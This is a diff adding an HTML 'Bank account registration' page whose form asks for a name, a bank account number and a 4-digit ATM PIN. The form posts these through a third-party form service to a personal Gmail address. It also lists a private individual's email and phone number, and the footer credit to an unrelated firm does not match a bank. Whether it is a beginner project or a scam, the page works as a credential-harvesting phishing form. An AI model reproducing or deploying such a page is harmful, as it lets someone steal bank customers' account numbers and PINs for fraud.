@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Bank account registration</title>
+    <link rel="stylesheet" href="fontawesome-free-5.12.0-web/css/all.css">
+
+    </script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+   <SCRIPT language=Javascript>
+      
+        function isNumberKey(evt) {
+            var charCode = (evt.which) ? evt.which : event.keyCode
+            if (charCode > 31 && (charCode < 48 || charCode > 57))
+                return false;
+
+            return true;
+        }
+    
+</SCRIPT>
+    <section class="contact">
+        <div class="section-center clearfix">
+
+
+            <div>
+                <a href="acct.html"  target="_blank" class="link"><button type="send" class="main-btn">My account</button></a>
+            </div>
+            
+            <div>
+                <a href="authen.html" target="_blank" class="link"><button type="send" class="main-btn">Authentication</button></a>
+            </div>
+    
+            <article class="contact-info">
+    
+    
+                <div class="contact-item">
+                    <h3 class="contact-title">
+                        <span class=contact-icon><i class="fas fa-location-arrow"></i></span>address
+                    </h3>
+                    <h3 class="contact-text">kukatpally, Hyderabad,Telangana</h3>
+    
+                </div>
+    
+                <div class="contact-item">
+                    <h3 class="contact-title">
+                        <span class=contact-icon><i class="fas fa-envelope"></i></span>email
+                    </h3>
+                    <h3 class="contact-text">sairusvarma201234@gmail.com</h3>
+    
+                </div>
+    
+                <div class="contact-item">
+                    <h3 class="contact-title">
+                        <span class=contact-icon><i class="fas fa-phone"></i></span>phone
+                    </h3>
+                    <h3 class="contact-text">+919494603171</h3>
+    
+                </div>
+    
+            </article>
+    
+            <article class="contact-form">
+    
+                <form action="https://formspree.io/sairusvarma201234@gmail.com" method="POST" class="form-group">
+                    <input type="text" name="name" placeholder="name" class="form-control" />
+    
+                    <input type="Account-number" name="Account-number"  maxlength="8"  onkeypress="return isNumberKey(event)" placeholder="Account-number" 
+                     pattern="\d{8}" required class="form-control" />
+
+                    
+    
+                <input type="ATM-PIN" name="ATM-PIN" maxlength="4" onkeypress="return isNumberKey(event)"  placeholder="ATM-PIN" pattern="\d{4}" required
+                    class="form-control" />
+
+    
+                    <button type="send" class="main-btn">REGISTER</button>
+    
+    
+                </form>
+    
+    
+            </article>
+        </div>
+    
+    </section>
+    
+    <footer class="footer">
+        <div class="section-center">
+            <div class="social-icons">
+                <a href="#" class="social-icon">
+                    <i class="fab fa-facebook"></i>
+                </a>
+    
+                <a href="#" class="social-icon">
+                    <i class="fab fa-twitter"></i>
+                </a>
+    
+                <a href="#" class="social-icon">
+                    <i class="fab fa-instagram"></i>
+                </a>
+    
+    
+    
+    
+    
+            </div>
+            <p class="footer-text">
+                &copy; <span class="text-primary">McKinley and Rice</span>. all rights reserved
+    
+            </p>
+        </div>
+    </footer>
+    <script src="app.js"></script>
+
+</body>
+</html>
